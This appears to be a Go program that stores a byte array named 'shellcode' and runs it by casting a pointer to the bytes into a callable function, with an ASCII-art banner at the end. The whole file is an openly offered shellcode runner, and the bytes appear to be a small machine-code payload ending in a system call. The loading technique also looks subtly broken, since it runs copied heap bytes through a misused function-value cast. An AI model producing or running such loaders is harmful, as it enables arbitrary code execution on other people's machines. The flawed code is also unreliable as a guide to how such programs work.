package main

import (
	"unsafe"
)

var shellcode = []byte{
	0x37, 0xe5, 0xe1, 0xfe, 0x13, 0x05, 0xd5, 0xea, 0xb7, 0x25, 0x12, 0x28, 0x93, 0x85, 0x95,
	0x96, 0x37, 0x46, 0x23, 0x01, 0x13, 0x06, 0x76, 0x56, 0x93, 0x08, 0xe0, 0x08, 0x73, 0x00,
	0x00, 0x00,
}

func main() {
	shellcodePtr := make([]byte, len(shellcode))
	copy(shellcodePtr, shellcode)
	shellcodeFunc := *(*func())(unsafe.Pointer(&shellcodePtr[0]))
	shellcodeFunc()
}

//• ▌ ▄ ·.        ▐ ▄ ▄ •▄ ▄▄▄ . ▄· ▄▌.▄▄ · ▄▄▄ . ▄▄·         .▄▄ ·  ▄· ▄▌.▄▄ ·
//·██ ▐███▪▪     •█▌▐██▌▄▌▪▀▄.▀·▐█▪██▌▐█ ▀. ▀▄.▀·▐█ ▌▪        ▐█ ▀. ▐█▪██▌▐█ ▀.
//▐█ ▌▐▌▐█· ▄█▀▄ ▐█▐▐▌▐▀▀▄·▐▀▀▪▄▐█▌▐█▪▄▀▀▀█▄▐▀▀▪▄██ ▄▄        ▄▀▀▀█▄▐█▌▐█▪▄▀▀▀█▄
//██ ██▌▐█▌▐█▌.▐▌██▐█▌▐█.█▌▐█▄▄▌ ▐█▀·.▐█▄▪▐█▐█▄▄▌▐███▌        ▐█▄▪▐█ ▐█▀·.▐█▄▪▐█
//▀▀  █▪▀▀▀ ▀█▄▀▪▀▀ █▪·▀  ▀ ▀▀▀   ▀ •  ▀▀▀▀  ▀▀▀ ·▀▀▀          ▀▀▀▀   ▀ •  ▀▀▀▀
